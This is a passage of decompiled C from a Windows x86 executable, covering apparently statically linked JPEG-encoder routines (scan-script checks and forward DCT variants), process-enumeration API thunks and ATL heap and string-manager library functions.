            (**(code **)*unaff_ESI)();
          }
          if ((0 < (int)local_1c) && (iVar3 <= piVar2[local_1c])) {
            *(undefined4 *)(*unaff_ESI + 0x14) = 0x13;
            *(int *)(*unaff_ESI + 0x18) = local_18;
            (**(code **)*unaff_ESI)();
          }
          local_1c = local_1c + 1;
          piVar4 = local_20;
        } while ((int)local_1c < (int)local_20);
      }
      local_1c = piVar2[7];
      local_2c = piVar2[5];
      local_24 = (int *)piVar2[6];
      local_30 = piVar2[8];
      if (*(char *)(unaff_ESI + 0x35) == '\0') {
        if ((((local_2c != 0) || (local_24 != (int *)0x3f)) || (local_1c != 0)) || (local_30 != 0))
        {
          *(undefined4 *)(*unaff_ESI + 0x14) = 0x11;
          *(int *)(*unaff_ESI + 0x18) = local_18;
          (**(code **)*unaff_ESI)();
        }
        if (0 < (int)piVar4) {
          local_24 = piVar2 + 1;
          local_28 = piVar4;
          do {
            iVar3 = *local_24;
            if (local_14[iVar3] != '\0') {
              *(undefined4 *)(*unaff_ESI + 0x14) = 0x13;
              *(int *)(*unaff_ESI + 0x18) = local_18;
              (**(code **)*unaff_ESI)();
            }
            local_24 = local_24 + 1;
            local_28 = (int *)((int)local_28 + -1);
            local_14[iVar3] = '\x01';
          } while (local_28 != (int *)0x0);
        }
      }
      else {
        if ((((0x3f < local_2c) || ((int)local_24 < (int)local_2c)) ||
            ((0x3f < (int)local_24 || ((10 < local_1c || ((int)local_30 < 0)))))) ||
           (10 < (int)local_30)) {
          *(undefined4 *)(*unaff_ESI + 0x14) = 0x11;
          *(int *)(*unaff_ESI + 0x18) = local_18;
          (**(code **)*unaff_ESI)();
        }
        if (local_2c == 0) {
          bVar5 = local_24 == (int *)0x0;
        }
        else {
          bVar5 = local_20 == (int *)0x1;
        }
        if (!bVar5) {
          *(undefined4 *)(*unaff_ESI + 0x14) = 0x11;
          *(int *)(*unaff_ESI + 0x18) = local_18;
          (**(code **)*unaff_ESI)();
        }
        piVar4 = local_20;
        if (0 < (int)local_20) {
          local_20 = piVar2 + 1;
          local_28 = piVar4;
          do {
            local_3c = local_a3c + *local_20 * 0x40;
            uVar1 = local_2c;
            if ((local_2c != 0) && (local_a3c[*local_20 * 0x40] < 0)) {
              *(undefined4 *)(*unaff_ESI + 0x14) = 0x11;
              *(int *)(*unaff_ESI + 0x18) = local_18;
              (**(code **)*unaff_ESI)();
              uVar1 = local_2c;
            }
            while (local_34 = uVar1, (int)uVar1 <= (int)local_24) {
              local_38 = (uint *)(local_3c + uVar1);
              uVar1 = local_3c[uVar1];
              if ((int)uVar1 < 0) {
                bVar5 = local_1c == 0;
LAB_0040ea4f:
                if (!bVar5) goto LAB_0040ea51;
              }
              else {
                if (local_1c == uVar1) {
                  bVar5 = local_30 == local_1c - 1;
                  goto LAB_0040ea4f;
                }
LAB_0040ea51:
                *(undefined4 *)(*unaff_ESI + 0x14) = 0x11;
                *(int *)(*unaff_ESI + 0x18) = local_18;
                (**(code **)*unaff_ESI)();
              }
              *local_38 = local_30;
              uVar1 = local_34 + 1;
            }
            local_20 = local_20 + 1;
            local_28 = (int *)((int)local_28 + -1);
          } while (local_28 != (int *)0x0);
        }
      }
      piVar2 = piVar2 + 9;
      local_18 = local_18 + 1;
    } while (local_18 <= unaff_ESI[0x2a]);
  }
  iVar3 = 0;
  if (*(char *)(unaff_ESI + 0x35) == '\0') {
    if (0 < unaff_ESI[0xf]) {
      do {
        if (local_14[iVar3] == '\0') {
          *(undefined4 *)(*unaff_ESI + 0x14) = 0x2d;
          (**(code **)*unaff_ESI)();
        }
        iVar3 = iVar3 + 1;
      } while (iVar3 < unaff_ESI[0xf]);
    }
  }
  else {
    iVar3 = 0;
    if (0 < unaff_ESI[0xf]) {
      piVar2 = local_a3c;
      do {
        if (*piVar2 < 0) {
          *(undefined4 *)(*unaff_ESI + 0x14) = 0x2d;
          (**(code **)*unaff_ESI)();
        }
        iVar3 = iVar3 + 1;
        piVar2 = piVar2 + 0x40;
      } while (iVar3 < unaff_ESI[0xf]);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_0040eb6d(void)

{
  int *piVar1;
  int *piVar2;
  int *piVar3;
  int iVar4;
  int *unaff_ESI;
  int iVar5;
  
  iVar5 = 0;
  if (unaff_ESI[0x2b] == 0) {
    if (4 < unaff_ESI[0xf]) {
      *(undefined4 *)(*unaff_ESI + 0x14) = 0x1a;
      *(int *)(*unaff_ESI + 0x18) = unaff_ESI[0xf];
      *(undefined4 *)(*unaff_ESI + 0x1c) = 4;
      (**(code **)*unaff_ESI)();
    }
    iVar5 = 0;
    unaff_ESI[0x39] = unaff_ESI[0xf];
    if (0 < unaff_ESI[0xf]) {
      iVar4 = 0;
      piVar1 = unaff_ESI + 0x3a;
      do {
        *piVar1 = unaff_ESI[0x11] + iVar4;
        iVar5 = iVar5 + 1;
        piVar1 = piVar1 + 1;
        iVar4 = iVar4 + 0x54;
      } while (iVar5 < unaff_ESI[0xf]);
    }
    iVar5 = 0;
    unaff_ESI[0x4b] = 0;
    unaff_ESI[0x4c] = 0x3f;
    unaff_ESI[0x4d] = 0;
  }
  else {
    piVar1 = (int *)(*(int *)(unaff_ESI[0x4f] + 0x1c) * 0x24 + unaff_ESI[0x2b]);
    unaff_ESI[0x39] = *piVar1;
    if (0 < *piVar1) {
      piVar3 = unaff_ESI + 0x3a;
      piVar2 = piVar1;
      do {
        piVar2 = piVar2 + 1;
        iVar5 = iVar5 + 1;
        *piVar3 = *piVar2 * 0x54 + unaff_ESI[0x11];
        piVar3 = piVar3 + 1;
      } while (iVar5 < *piVar1);
    }
    unaff_ESI[0x4b] = piVar1[5];
    unaff_ESI[0x4c] = piVar1[6];
    unaff_ESI[0x4d] = piVar1[7];
    iVar5 = piVar1[8];
  }
  unaff_ESI[0x4e] = iVar5;
  return;
}



uint FUN_0040ec41(void)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  int *unaff_ESI;
  int *local_c;
  uint local_8;
  
  iVar2 = unaff_ESI[0x39];
  if (iVar2 == 1) {
    iVar2 = unaff_ESI[0x3a];
    unaff_ESI[0x3e] = *(int *)(iVar2 + 0x1c);
    unaff_ESI[0x3f] = *(int *)(iVar2 + 0x20);
    uVar4 = *(uint *)(iVar2 + 0xc);
    uVar1 = *(uint *)(iVar2 + 0x20) / uVar4;
    uVar3 = *(uint *)(iVar2 + 0x20) % uVar4;
    *(undefined4 *)(iVar2 + 0x34) = 1;
    *(undefined4 *)(iVar2 + 0x38) = 1;
    *(undefined4 *)(iVar2 + 0x3c) = 1;
    *(undefined4 *)(iVar2 + 0x40) = 8;
    *(undefined4 *)(iVar2 + 0x44) = 1;
    if (uVar3 == 0) {
      uVar3 = uVar4;
    }
    *(uint *)(iVar2 + 0x48) = uVar3;
    unaff_ESI[0x41] = 0;
    unaff_ESI[0x40] = 1;
  }
  else {
    if ((iVar2 < 1) || (4 < iVar2)) {
      *(undefined4 *)(*unaff_ESI + 0x14) = 0x1a;
      *(int *)(*unaff_ESI + 0x18) = unaff_ESI[0x39];
      *(undefined4 *)(*unaff_ESI + 0x1c) = 4;
      (**(code **)*unaff_ESI)();
    }
    iVar2 = FUN_00409e2d(unaff_ESI[7],unaff_ESI[0x36] << 3);
    unaff_ESI[0x3e] = iVar2;
    uVar1 = FUN_00409e2d(unaff_ESI[8],unaff_ESI[0x37] << 3);
    unaff_ESI[0x3f] = uVar1;
    unaff_ESI[0x40] = 0;
    local_8 = 0;
    if (0 < unaff_ESI[0x39]) {
      local_c = unaff_ESI + 0x3a;
      do {
        iVar2 = *local_c;
        uVar1 = *(uint *)(iVar2 + 8);
        *(uint *)(iVar2 + 0x40) = uVar1 << 3;
        uVar4 = *(uint *)(iVar2 + 0x1c) % uVar1;
        *(int *)(iVar2 + 0x38) = *(int *)(iVar2 + 0xc);
        iVar5 = *(int *)(iVar2 + 0xc) * uVar1;
        *(uint *)(iVar2 + 0x34) = uVar1;
        *(int *)(iVar2 + 0x3c) = iVar5;
        if (uVar4 == 0) {
          uVar4 = uVar1;
        }
        *(uint *)(iVar2 + 0x44) = uVar4;
        uVar1 = *(uint *)(iVar2 + 0x20) % *(uint *)(iVar2 + 0xc);
        if (uVar1 == 0) {
          uVar1 = *(uint *)(iVar2 + 0xc);
        }
        *(uint *)(iVar2 + 0x48) = uVar1;
        if (10 < unaff_ESI[0x40] + iVar5) {
          *(undefined4 *)(*unaff_ESI + 0x14) = 0xd;
          (**(code **)*unaff_ESI)();
        }
        for (; 0 < iVar5; iVar5 = iVar5 + -1) {
          unaff_ESI[unaff_ESI[0x40] + 0x41] = local_8;
          unaff_ESI[0x40] = unaff_ESI[0x40] + 1;
        }
        uVar1 = local_8 + 1;
        local_c = local_c + 1;
        local_8 = uVar1;
      } while ((int)uVar1 < unaff_ESI[0x39]);
    }
  }
  if (0 < unaff_ESI[0x30]) {
    uVar1 = unaff_ESI[0x3e] * unaff_ESI[0x30];
    if (0xfffe < (int)uVar1) {
      uVar1 = 0xffff;
    }
    unaff_ESI[0x2f] = uVar1;
  }
  return uVar1;
}



void __cdecl FUN_0040ef47(int param_1)

{
  *(undefined *)(*(int *)(param_1 + 0x13c) + 0xc) = 0;
  (**(code **)(*(int *)(param_1 + 0x14c) + 4))(param_1);
  (**(code **)(*(int *)(param_1 + 0x14c) + 8))(param_1);
  return;
}



void __cdecl FUN_0040efc6(int param_1,char param_2)

{
  undefined4 *puVar1;
  int iVar2;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x20);
  *(undefined4 **)(param_1 + 0x13c) = puVar1;
  *puVar1 = &LAB_0040eddd;
  puVar1[1] = FUN_0040ef47;
  puVar1[2] = &LAB_0040ef6e;
  *(undefined *)((int)puVar1 + 0xd) = 0;
  FUN_0040e6a1();
  if (*(int *)(param_1 + 0xac) == 0) {
    *(undefined *)(param_1 + 0xd4) = 0;
    *(undefined4 *)(param_1 + 0xa8) = 1;
  }
  else {
    FUN_0040e841();
  }
  if (*(char *)(param_1 + 0xd4) != '\0') {
    *(undefined *)(param_1 + 0xb2) = 1;
  }
  if (param_2 == '\0') {
    puVar1[4] = 0;
  }
  else {
    puVar1[4] = (*(char *)(param_1 + 0xb2) == '\0') + 1;
  }
  puVar1[7] = 0;
  puVar1[5] = 0;
  iVar2 = *(int *)(param_1 + 0xa8);
  if (*(char *)(param_1 + 0xb2) != '\0') {
    iVar2 = iVar2 * 2;
  }
  puVar1[6] = iVar2;
  return;
}



void __cdecl FUN_0040f065(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int local_18;
  
  local_18 = 7;
  piVar1 = (int *)(param_1 + 8);
  do {
    iVar3 = piVar1[-2] + piVar1[5];
    iVar6 = piVar1[-2] - piVar1[5];
    iVar4 = piVar1[-1] + piVar1[4];
    iVar9 = piVar1[-1] - piVar1[4];
    iVar5 = piVar1[3] + *piVar1;
    iVar10 = *piVar1 - piVar1[3];
    iVar7 = piVar1[2] + piVar1[1];
    iVar2 = piVar1[1] - piVar1[2];
    iVar8 = iVar7 + iVar3;
    iVar3 = iVar3 - iVar7;
    iVar7 = iVar5 + iVar4;
    iVar4 = iVar4 - iVar5;
    piVar1[-2] = (iVar7 + iVar8) * 4;
    piVar1[2] = (iVar8 - iVar7) * 4;
    iVar5 = (iVar4 + iVar3) * 0x1151;
    *piVar1 = iVar3 * 0x187e + 0x400 + iVar5 >> 0xb;
    piVar1[4] = iVar5 + iVar4 * -0x3b21 + 0x400 >> 0xb;
    iVar3 = (iVar10 + iVar6 + iVar2 + iVar9) * 0x25a1;
    iVar4 = (iVar2 + iVar6) * -0x1ccd;
    iVar5 = (iVar10 + iVar9) * -0x5203;
    iVar7 = iVar3 + (iVar2 + iVar9) * -0x3ec5;
    iVar3 = iVar3 + (iVar10 + iVar6) * -0xc7c;
    piVar1[5] = iVar2 * 0x98e + iVar7 + 0x400 + iVar4 >> 0xb;
    piVar1[1] = iVar9 * 0x6254 + iVar7 + 0x400 + iVar5 >> 0xb;
    piVar1[3] = iVar10 * 0x41b3 + iVar3 + 0x400 + iVar5 >> 0xb;
    piVar1[-1] = iVar6 * 0x300b + iVar3 + 0x400 + iVar4 >> 0xb;
    piVar1 = piVar1 + 8;
    local_18 = local_18 + -1;
  } while (-1 < local_18);
  local_18 = 7;
  piVar1 = (int *)(param_1 + 0x40);
  do {
    iVar3 = piVar1[-0x10] + piVar1[0x28];
    iVar6 = piVar1[-0x10] - piVar1[0x28];
    iVar4 = piVar1[-8] + piVar1[0x20];
    iVar9 = piVar1[-8] - piVar1[0x20];
    iVar5 = piVar1[0x18] + *piVar1;
    iVar10 = *piVar1 - piVar1[0x18];
    iVar7 = piVar1[0x10] + piVar1[8];
    iVar2 = piVar1[8] - piVar1[0x10];
    iVar8 = iVar7 + iVar3;
    iVar3 = iVar3 - iVar7;
    iVar7 = iVar5 + iVar4;
    iVar4 = iVar4 - iVar5;
    piVar1[-0x10] = iVar7 + 2 + iVar8 >> 2;
    piVar1[0x10] = (iVar8 - iVar7) + 2 >> 2;
    iVar5 = (iVar4 + iVar3) * 0x1151;
    *piVar1 = iVar3 * 0x187e + 0x4000 + iVar5 >> 0xf;
    piVar1[0x20] = iVar5 + iVar4 * -0x3b21 + 0x4000 >> 0xf;
    iVar3 = (iVar10 + iVar6 + iVar2 + iVar9) * 0x25a1;
    iVar4 = (iVar2 + iVar6) * -0x1ccd;
    iVar5 = (iVar10 + iVar9) * -0x5203;
    iVar7 = iVar3 + (iVar2 + iVar9) * -0x3ec5;
    iVar3 = iVar3 + (iVar10 + iVar6) * -0xc7c;
    piVar1[0x28] = iVar2 * 0x98e + iVar7 + 0x4000 + iVar4 >> 0xf;
    piVar1[8] = iVar9 * 0x6254 + iVar7 + 0x4000 + iVar5 >> 0xf;
    piVar1[0x18] = iVar10 * 0x41b3 + iVar3 + 0x4000 + iVar5 >> 0xf;
    piVar1[-8] = iVar6 * 0x300b + iVar3 + 0x4000 + iVar4 >> 0xf;
    piVar1 = piVar1 + 1;
    local_18 = local_18 + -1;
  } while (-1 < local_18);
  return;
}



void __cdecl FUN_0040f35d(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int local_10;
  
  local_10 = 7;
  piVar1 = (int *)(param_1 + 8);
  do {
    iVar5 = piVar1[-2] + piVar1[5];
    iVar8 = piVar1[-2] - piVar1[5];
    iVar4 = piVar1[-1] + piVar1[4];
    iVar2 = piVar1[-1] - piVar1[4];
    iVar9 = piVar1[3] + *piVar1;
    iVar3 = *piVar1 - piVar1[3];
    iVar10 = piVar1[2] + piVar1[1];
    iVar7 = piVar1[2];
    iVar6 = iVar10 + iVar5;
    iVar5 = iVar5 - iVar10;
    iVar10 = iVar9 + iVar4;
    piVar1[-2] = iVar10 + iVar6;
    piVar1[2] = iVar6 - iVar10;
    iVar4 = ((iVar5 - iVar9) + iVar4) * 0xb5 >> 8;
    piVar1[4] = iVar5 - iVar4;
    iVar6 = iVar3 + (piVar1[1] - iVar7);
    *piVar1 = iVar4 + iVar5;
    iVar5 = iVar2 + iVar8;
    iVar4 = (iVar6 - iVar5) * 0x62 >> 8;
    iVar7 = (iVar6 * 0x8b >> 8) + iVar4;
    iVar4 = (iVar5 * 0x14e >> 8) + iVar4;
    iVar6 = (iVar3 + iVar2) * 0xb5 >> 8;
    iVar5 = iVar6 + iVar8;
    iVar8 = iVar8 - iVar6;
    piVar1[3] = iVar8 + iVar7;
    piVar1[1] = iVar8 - iVar7;
    piVar1[-1] = iVar5 + iVar4;
    piVar1[5] = iVar5 - iVar4;
    piVar1 = piVar1 + 8;
    local_10 = local_10 + -1;
  } while (-1 < local_10);
  local_10 = 7;
  piVar1 = (int *)(param_1 + 0x40);
  do {
    iVar5 = piVar1[-0x10] + piVar1[0x28];
    iVar8 = piVar1[-0x10] - piVar1[0x28];
    iVar4 = piVar1[-8] + piVar1[0x20];
    iVar2 = piVar1[-8] - piVar1[0x20];
    iVar9 = piVar1[0x18] + *piVar1;
    iVar3 = *piVar1 - piVar1[0x18];
    iVar10 = piVar1[0x10] + piVar1[8];
    iVar7 = piVar1[0x10];
    iVar6 = iVar10 + iVar5;
    iVar5 = iVar5 - iVar10;
    iVar10 = iVar9 + iVar4;
    piVar1[-0x10] = iVar10 + iVar6;
    piVar1[0x10] = iVar6 - iVar10;
    iVar4 = ((iVar5 - iVar9) + iVar4) * 0xb5 >> 8;
    piVar1[0x20] = iVar5 - iVar4;
    iVar6 = iVar3 + (piVar1[8] - iVar7);
    *piVar1 = iVar4 + iVar5;
    iVar5 = iVar2 + iVar8;
    iVar4 = (iVar6 - iVar5) * 0x62 >> 8;
    iVar7 = (iVar6 * 0x8b >> 8) + iVar4;
    iVar4 = (iVar5 * 0x14e >> 8) + iVar4;
    iVar6 = (iVar3 + iVar2) * 0xb5 >> 8;
    iVar5 = iVar6 + iVar8;
    iVar8 = iVar8 - iVar6;
    piVar1[0x18] = iVar8 + iVar7;
    piVar1[8] = iVar8 - iVar7;
    piVar1[-8] = iVar5 + iVar4;
    piVar1[0x28] = iVar5 - iVar4;
    piVar1 = piVar1 + 1;
    local_10 = local_10 + -1;
  } while (-1 < local_10);
  return;
}



void __cdecl FUN_0040f53b(int param_1)

{
  float fVar1;
  float fVar2;
  float fVar3;
  float fVar4;
  float fVar5;
  float fVar6;
  float fVar7;
  float *pfVar8;
  int iVar9;
  
  iVar9 = 7;
  pfVar8 = (float *)(param_1 + 8);
  do {
    fVar4 = pfVar8[-2] - pfVar8[5];
    fVar1 = pfVar8[4];
    fVar2 = *pfVar8;
    fVar3 = pfVar8[2];
    fVar5 = pfVar8[1] + pfVar8[2] + pfVar8[-2] + pfVar8[5];
    fVar6 = (pfVar8[-2] + pfVar8[5]) - (pfVar8[1] + pfVar8[2]);
    fVar7 = pfVar8[3] + *pfVar8 + pfVar8[4] + pfVar8[-1];
    pfVar8[-2] = fVar7 + fVar5;
    pfVar8[2] = fVar5 - fVar7;
    fVar5 = (((pfVar8[4] + pfVar8[-1]) - (pfVar8[3] + *pfVar8)) + fVar6) * 0.7071068;
    *pfVar8 = fVar5 + fVar6;
    pfVar8[4] = fVar6 - fVar5;
    fVar3 = (pfVar8[1] - fVar3) + (fVar2 - pfVar8[3]);
    fVar5 = (pfVar8[-1] - fVar1) + fVar4;
    fVar6 = (fVar3 - fVar5) * 0.3826834;
    fVar3 = fVar3 * 0.5411961 + fVar6;
    fVar6 = fVar5 * 1.306563 + fVar6;
    fVar1 = ((fVar2 - pfVar8[3]) + (pfVar8[-1] - fVar1)) * 0.7071068;
    fVar2 = fVar1 + fVar4;
    fVar4 = fVar4 - fVar1;
    iVar9 = iVar9 + -1;
    pfVar8[3] = fVar4 + fVar3;
    pfVar8[1] = fVar4 - fVar3;
    pfVar8[-1] = fVar2 + fVar6;
    pfVar8[5] = fVar2 - fVar6;
    pfVar8 = pfVar8 + 8;
  } while (-1 < iVar9);
  iVar9 = 7;
  pfVar8 = (float *)(param_1 + 0x40);
  do {
    fVar5 = pfVar8[-0x10] - pfVar8[0x28];
    fVar1 = pfVar8[0x20];
    fVar2 = *pfVar8;
    fVar3 = pfVar8[0x10];
    fVar4 = pfVar8[0x10] + pfVar8[8] + pfVar8[-0x10] + pfVar8[0x28];
    fVar6 = (pfVar8[-0x10] + pfVar8[0x28]) - (pfVar8[0x10] + pfVar8[8]);
    fVar7 = pfVar8[0x18] + *pfVar8 + pfVar8[0x20] + pfVar8[-8];
    pfVar8[-0x10] = fVar7 + fVar4;
    pfVar8[0x10] = fVar4 - fVar7;
    fVar4 = (((pfVar8[0x20] + pfVar8[-8]) - (pfVar8[0x18] + *pfVar8)) + fVar6) * 0.7071068;
    *pfVar8 = fVar4 + fVar6;
    pfVar8[0x20] = fVar6 - fVar4;
    fVar4 = (pfVar8[8] - fVar3) + (fVar2 - pfVar8[0x18]);
    fVar6 = (pfVar8[-8] - fVar1) + fVar5;
    fVar3 = (fVar4 - fVar6) * 0.3826834;
    fVar4 = fVar4 * 0.5411961 + fVar3;
    fVar3 = fVar6 * 1.306563 + fVar3;
    fVar1 = ((fVar2 - pfVar8[0x18]) + (pfVar8[-8] - fVar1)) * 0.7071068;
    fVar2 = fVar1 + fVar5;
    fVar5 = fVar5 - fVar1;
    iVar9 = iVar9 + -1;
    pfVar8[0x18] = fVar5 + fVar4;
    pfVar8[8] = fVar5 - fVar4;
    pfVar8[-8] = fVar2 + fVar3;
    pfVar8[0x28] = fVar2 - fVar3;
    pfVar8 = pfVar8 + 1;
  } while (-1 < iVar9);
  return;
}



void CreateToolhelp32Snapshot(void)

{
                    // WARNING: Could not recover jumptable at 0x0040f7bc. Too many branches
                    // WARNING: Treating indirect jump as call
  CreateToolhelp32Snapshot();
  return;
}



void Process32FirstW(void)

{
                    // WARNING: Could not recover jumptable at 0x0040f7c2. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32FirstW();
  return;
}



void Process32NextW(void)

{
                    // WARNING: Could not recover jumptable at 0x0040f7c8. Too many branches
                    // WARNING: Treating indirect jump as call
  Process32NextW();
  return;
}



// Library Function - Single Match
//  public: virtual __thiscall ATL::CWin32Heap::~CWin32Heap(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall ATL::CWin32Heap::~CWin32Heap(CWin32Heap *this)

{
  *(undefined ***)this = &PTR_FUN_00424e08;
  if ((this[8] != (CWin32Heap)0x0) && (*(HANDLE *)(this + 4) != (HANDLE)0x0)) {
    HeapDestroy(*(HANDLE *)(this + 4));
  }
  return;
}



void __thiscall FUN_0040f7e9(void *this,SIZE_T param_1)

{
  HeapAlloc(*(HANDLE *)((int)this + 4),0,param_1);
  return;
}



void __thiscall FUN_0040f800(void *this,LPVOID param_1)

{
  if (param_1 != (LPVOID)0x0) {
    HeapFree(*(HANDLE *)((int)this + 4),0,param_1);
  }
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall ATL::CWin32Heap::Reallocate(void *,unsigned int)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void * __thiscall ATL::CWin32Heap::Reallocate(CWin32Heap *this,void *param_1,uint param_2)

{
  void *pvVar1;
  
  if (param_1 == (void *)0x0) {
    pvVar1 = (void *)(***(code ***)this)(param_2);
  }
  else if (param_2 == 0) {
    (**(code **)(*(int *)this + 4))(param_1);
    pvVar1 = (void *)0x0;
  }
  else {
    pvVar1 = HeapReAlloc(*(HANDLE *)(this + 4),0,param_1,param_2);
  }
  return pvVar1;
}



void __thiscall FUN_0040f857(void *this,LPCVOID param_1)

{
  HeapSize(*(HANDLE *)((int)this + 4),0,param_1);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall ATL::CWin32Heap::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void * __thiscall ATL::CWin32Heap::_scalar_deleting_destructor_(CWin32Heap *this,uint param_1)

{
  ~CWin32Heap(this);
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return this;
}



// Library Function - Single Match
//  public: __thiscall ATL::CAtlStringMgr::CAtlStringMgr(struct ATL::IAtlMemMgr *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall ATL::CAtlStringMgr::CAtlStringMgr(CAtlStringMgr *this,IAtlMemMgr *param_1)

{
  *(IAtlMemMgr **)(this + 4) = param_1;
  *(undefined ***)this = &PTR_Allocate_00424e1c;
  *(undefined4 *)(this + 0x14) = 2;
  *(undefined4 *)(this + 0xc) = 0;
  *(undefined4 *)(this + 0x10) = 0;
  *(undefined2 *)(this + 0x18) = 0;
  *(undefined2 *)(this + 0x1a) = 0;
  *(CAtlStringMgr **)(this + 8) = this;
  return;
}



// Library Function - Single Match
//  long __cdecl ATL::AtlMultiply<unsigned long>(unsigned long *,unsigned long,unsigned long)
// 
// Library: Visual Studio 2008 Release

long __cdecl ATL::AtlMultiply<unsigned_long>(ulong *param_1,ulong param_2,ulong param_3)

{
  if ((int)((ulonglong)param_2 * (ulonglong)param_3 >> 0x20) != 0) {
    return -0x7ff8ffa9;
  }
  *param_1 = (ulong)((ulonglong)param_2 * (ulonglong)param_3);
  return 0;
}



void __fastcall FUN_0040f8e4(int param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040f8ef. Too many branches
                    // WARNING: Treating indirect jump as call
  (**(code **)(**(int **)(param_1 + 4) + 4))();
  return;
}



undefined4 * __thiscall FUN_0040f903(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_Allocate_00424e1c;
  if ((param_1 & 1) != 0) {
    FUN_0040fb79(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  long __cdecl ATL::AtlAdd<unsigned int>(unsigned int *,unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

long __cdecl ATL::AtlAdd<unsigned_int>(uint *param_1,uint param_2,uint param_3)

{
  if (-param_2 - 1 < param_3) {
    return -0x7ff8ffa9;
  }
  *param_1 = param_2 + param_3;
  return 0;
}



// Library Function - Single Match
//  public: virtual struct ATL::CStringData * __thiscall ATL::CAtlStringMgr::Allocate(int,int)
// 
// Library: Visual Studio 2008 Release

CStringData * __thiscall ATL::CAtlStringMgr::Allocate(CAtlStringMgr *this,int param_1,int param_2)

{
  long lVar1;
  CAtlStringMgr **ppCVar2;
  uint uVar3;
  
  uVar3 = param_1 + 8U & 0xfffffff8;
  lVar1 = AtlMultiply<unsigned_long>((ulong *)&param_1,uVar3,param_2);
  if (((-1 < lVar1) && (lVar1 = AtlAdd<unsigned_int>((uint *)&param_1,0x10,param_1), -1 < lVar1)) &&
     (ppCVar2 = (CAtlStringMgr **)(**(code **)**(undefined4 **)(this + 4))(param_1),
     ppCVar2 != (CAtlStringMgr **)0x0)) {
    ppCVar2[1] = (CAtlStringMgr *)0x0;
    *ppCVar2 = this;
    ppCVar2[3] = (CAtlStringMgr *)0x1;
    ppCVar2[2] = (CAtlStringMgr *)(uVar3 - 1);
    return (CStringData *)ppCVar2;
  }
  return (CStringData *)0x0;
}



// Library Function - Single Match
//  public: virtual struct ATL::CStringData * __thiscall ATL::CAtlStringMgr::Reallocate(struct
// ATL::CStringData *,int,int)
// 
// Library: Visual Studio 2008 Release

CStringData * __thiscall
ATL::CAtlStringMgr::Reallocate(CAtlStringMgr *this,CStringData *param_1,int param_2,int param_3)

{
  long lVar1;
  CStringData *pCVar2;
  uint uVar3;
  
  uVar3 = param_2 + 8U & 0xfffffff8;
  lVar1 = AtlMultiply<unsigned_long>((ulong *)&param_2,uVar3,param_3);
  if (((-1 < lVar1) && (lVar1 = AtlAdd<unsigned_int>((uint *)&param_2,0x10,param_2), -1 < lVar1)) &&
     (pCVar2 = (CStringData *)(**(code **)(**(int **)(this + 4) + 8))(param_1,param_2),
     pCVar2 != (CStringData *)0x0)) {
    *(uint *)(pCVar2 + 8) = uVar3 - 1;
    return pCVar2;
  }
  return (CStringData *)0x0;
}



void __fastcall FUN_0040fa0a(void **param_1)

{
  if (*param_1 != (void *)0x0) {
    _free(*param_1);
    *param_1 = (void *)0x0;
  }
  param_1[1] = (void *)0x0;
  param_1[2] = (void *)0x0;
  return;
}



void * __fastcall FUN_0040fa29(void *param_1)

{
  _memset(param_1,0,0x18);
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 __fastcall FUN_0040fa3f(LPCRITICAL_SECTION param_1)

{
  InitializeCriticalSection(param_1);
  return 0;
}



int __thiscall FUN_0040fa8a(void *this,int param_1)

{
  code *pcVar1;
  int iVar2;
  
  if ((-1 < param_1) && (param_1 < *(int *)((int)this + 4))) {
                    // WARNING: Load size is inaccurate
    return *this + param_1 * 4;
  }
  RaiseException(0xc000008c,1,0,(ULONG_PTR *)0x0);
  pcVar1 = (code *)swi(3);
  iVar2 = (*pcVar1)();
  return iVar2;
}



int __fastcall FUN_0040fab6(int param_1)

{
  FUN_0040fa29((void *)(param_1 + 0x14));
  *(undefined4 *)(param_1 + 0x2c) = 0;
  *(undefined4 *)(param_1 + 0x30) = 0;
  *(undefined4 *)(param_1 + 0x34) = 0;
  return param_1;
}



void __fastcall FUN_0040fad2(int param_1)

{
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x14));
  FUN_0040fa0a((void **)(param_1 + 0x2c));
  return;
}



// Library Function - Single Match
//  public: struct HINSTANCE__ * __thiscall ATL::CAtlBaseModule::GetHInstanceAt(int)
// 
// Library: Visual Studio 2008 Release

HINSTANCE__ * __thiscall ATL::CAtlBaseModule::GetHInstanceAt(CAtlBaseModule *this,int param_1)

{
  LPCRITICAL_SECTION lpCriticalSection;
  HINSTANCE__ **ppHVar1;
  HINSTANCE__ *pHVar2;
  
  lpCriticalSection = (LPCRITICAL_SECTION)(this + 0x14);
  EnterCriticalSection(lpCriticalSection);
  if ((*(int *)(this + 0x30) < param_1) || (param_1 < 0)) {
    LeaveCriticalSection(lpCriticalSection);
    pHVar2 = (HINSTANCE__ *)0x0;
  }
  else {
    if (param_1 == *(int *)(this + 0x30)) {
      pHVar2 = *(HINSTANCE__ **)(this + 8);
    }
    else {
      ppHVar1 = (HINSTANCE__ **)FUN_0040fa8a(this + 0x2c,param_1);
      pHVar2 = *ppHVar1;
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return pHVar2;
}



